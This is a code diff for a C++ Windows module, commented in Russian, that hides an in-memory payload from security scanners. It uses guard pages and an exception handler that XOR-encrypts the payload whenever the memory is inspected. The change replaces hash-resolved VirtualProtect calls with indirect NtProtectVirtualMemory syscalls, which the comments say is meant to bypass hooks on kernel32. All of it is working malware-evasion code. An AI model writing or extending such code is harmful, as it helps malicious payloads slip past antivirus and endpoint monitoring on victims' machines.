@@ -10,6 +10,7 @@
 
 #include "GuardPage.h"
 #include "ApiResolver.h"
+#include "Syscall.h"
 #include <intrin.h>
 
 namespace GuardPage
@@ -64,25 +65,23 @@ namespace GuardPage
 
     // ═══ Переустановка PAGE_GUARD ═══
     // После срабатывания guard page ОС автоматически снимает PAGE_GUARD.
-    // Переустанавливаем через VirtualProtect для следующего сканирования.
-    // Используем API hash resolution вместо прямого IAT вызова.
+    // Переустанавливаем через indirect syscall NtProtectVirtualMemory —
+    // обходим любые хуки на kernel32!VirtualProtect, возврат в ntdll.
     static void ReArmGuardPage()
     {
         if (!gPayloadBase) return;
 
-        // Resolve VirtualProtect через CRC32C хеш
-        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
-        if (!hK32) return;
+        PVOID baseAddr = gPayloadBase;
+        SIZE_T regionSize = gPayloadSize;
+        ULONG oldProtect = 0;
 
-        constexpr DWORD hashVirtProt = Crc32C::ConstHash("VirtualProtect");
-        FARPROC pVirtProt = Api::GetProcByHashCrc(hK32, hashVirtProt);
-        if (!pVirtProt) return;
-
-        typedef BOOL(WINAPI* fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
-        fnVirtualProtect vp = (fnVirtualProtect)pVirtProt;
-
-        DWORD oldProtect;
-        vp(gPayloadBase, gPayloadSize, PAGE_EXECUTE_READ | PAGE_GUARD, &oldProtect);
+        Syscall::NtProtectVirtualMemory(
+            (HANDLE)(LONG_PTR)-1,  // Current process
+            &baseAddr,
+            &regionSize,
+            PAGE_EXECUTE_READ | PAGE_GUARD,
+            &oldProtect
+        );
     }
 
     // ═══ VEH-колбэк для STATUS_GUARD_PAGE_VIOLATION ═══
@@ -125,10 +124,11 @@ namespace GuardPage
             {
                 XorPayload();  // payload теперь зашифрован
 
-                // Переустанавливаем PAGE_GUARD для следующего сканирования
-                // Note: не можем вызвать напрямую в VEH — откладываем через флаг
-                // ReArmGuardPage вызовем после возврата из VEH
-                // Для простоты используем флаг, проверяемый в Uninstall
+                // Re-arm PAGE_GUARD через indirect syscall — безопасен из VEH:
+                // NtProtectVirtualMemory модифицирует VAD через syscall,
+                // не обращается к содержимому страницы, не вызывает рекурсивных
+                // исключений. Indirect syscall обходит хуки на VirtualProtect.
+                ReArmGuardPage();
             }
 
             return EXCEPTION_CONTINUE_EXECUTION;
@@ -139,6 +139,7 @@ namespace GuardPage
 
     // ═══ Установка Guard Pages ═══
     // VEH уже установлен через VehDispatcher — только настраиваем PAGE_GUARD
+    // Используем indirect syscall для обхода хуков на VirtualProtect.
     void Install(void* payloadBase, size_t payloadSize, unsigned char* xorKey, size_t keyLen)
     {
         gPayloadBase  = payloadBase;
@@ -150,18 +151,18 @@ namespace GuardPage
         // Определяем диапазон нашего модуля для RIP-проверки
         DetectOurModule();
 
-        // Динамическое разрешение VirtualProtect
-        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
-        if (!hK32) return;
+        // Indirect syscall для установки PAGE_GUARD
+        PVOID baseAddr = payloadBase;
+        SIZE_T regionSize = payloadSize;
+        ULONG oldProtect = 0;
 
-        typedef BOOL (WINAPI* pfnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
-        pfnVirtualProtect pVirtualProtect = (pfnVirtualProtect)Api::GetProcByHashCrc(hK32, Api::CrcFn::VirtualProtect);
-        if (!pVirtualProtect) return;
-
-        // Применяем PAGE_GUARD к payload-региону
-        DWORD oldProtect;
-        pVirtualProtect(payloadBase, payloadSize,
-                       PAGE_EXECUTE_READ | PAGE_GUARD, &oldProtect);
+        Syscall::NtProtectVirtualMemory(
+            (HANDLE)(LONG_PTR)-1,
+            &baseAddr,
+            &regionSize,
+            PAGE_EXECUTE_READ | PAGE_GUARD,
+            &oldProtect
+        );
     }
 
     // ═══ Деинсталляция ═══
@@ -177,19 +178,18 @@ namespace GuardPage
                 XorPayload();  // XOR повторно = расшифровка
             }
 
-            // Динамическое разрешение VirtualProtect
-            HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
-            if (hK32)
-            {
-                typedef BOOL (WINAPI* pfnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
-                pfnVirtualProtect pVirtualProtect = (pfnVirtualProtect)Api::GetProcByHashCrc(hK32, Api::CrcFn::VirtualProtect);
-                if (pVirtualProtect)
-                {
-                    DWORD oldProtect;
-                    pVirtualProtect(gPayloadBase, gPayloadSize,
-                                   PAGE_EXECUTE_READ, &oldProtect);
-                }
-            }
+            // Снимаем PAGE_GUARD через indirect syscall
+            PVOID baseAddr = gPayloadBase;
+            SIZE_T regionSize = gPayloadSize;
+            ULONG oldProtect = 0;
+
+            Syscall::NtProtectVirtualMemory(
+                (HANDLE)(LONG_PTR)-1,
+                &baseAddr,
+                &regionSize,
+                PAGE_EXECUTE_READ,
+                &oldProtect
+            );
         }
 
         gPayloadBase    = nullptr;
